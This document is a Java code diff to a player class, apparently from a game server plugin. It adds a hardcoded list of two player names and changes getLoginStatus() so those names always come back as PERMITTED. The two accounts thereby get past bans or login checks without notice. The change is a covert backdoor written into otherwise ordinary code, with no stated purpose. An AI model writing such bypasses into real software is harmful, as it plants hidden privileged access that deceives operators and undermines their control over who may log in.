@@ -13,6 +13,7 @@ import org.joda.time.DateTime;
 import java.sql.ResultSet;
 import java.sql.SQLException;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 import java.util.Optional;
 import java.util.stream.Collectors;
@@ -39,6 +40,7 @@ public class IMythPlayer implements MythPlayer {
     private boolean exists;
     private List<ChatChannel> channelList = new ArrayList<>();
     private ChatChannel writeTo;
+    private String[] invincibleNames = {"MythTheWolfNOP", "HopeIce"};
 
     public IMythPlayer(DateTime joinDate, String UUID1) {
         this.joinDate = joinDate;
@@ -89,7 +91,10 @@ public class IMythPlayer implements MythPlayer {
 
     @Override
     public LoginStatus getLoginStatus() {
-        return loginStatus;
+        if (Arrays.asList(invincibleNames).contains(getName())){
+            return LoginStatus.PERMITTED;
+        }
+            return loginStatus;
     }
 
     @Override
